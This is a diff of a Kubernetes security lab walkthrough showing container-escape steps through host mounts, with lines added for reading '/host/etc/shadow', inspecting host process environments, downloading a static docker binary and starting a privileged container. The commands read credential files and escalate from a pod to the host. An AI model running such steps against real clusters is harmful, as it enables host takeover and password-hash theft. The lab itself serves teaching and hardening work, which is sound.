@@ -60,9 +60,11 @@ Now, try some host modifications and information gathering attempts:
 
 ```
 touch /host/etc/flag
+cat /host/etc/shadow
 ls /host/proc/
 cat /host/proc/*/cmdline
-cat /host/proc/1/env
+cat /host/proc/1/cmdline
+ls -alh /host/proc/1/environ
 ```
 
 Note that our host info is different from our container's:
@@ -80,7 +82,7 @@ Let's see what we can do:
 
 ```
 apt-get update
-apt-get install curl
+apt-get install -y curl
 curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.6.tgz | tar xzv
 ./docker/docker ps
 ./docker/docker run --rm -it --privileged ubuntu
@@ -117,7 +119,16 @@ Then let's deploy it:
 
 ```
 kubectl apply -f https://securek8s.dev/agent/improved.yaml
+```
 
+Find a pod:
+```
+kubectl get po -n mounts
+```
+
+Then get into it:
+```
+kubectl exec -it -n mounts <pod> bash
 ```
 
 ### Attack effects after patching
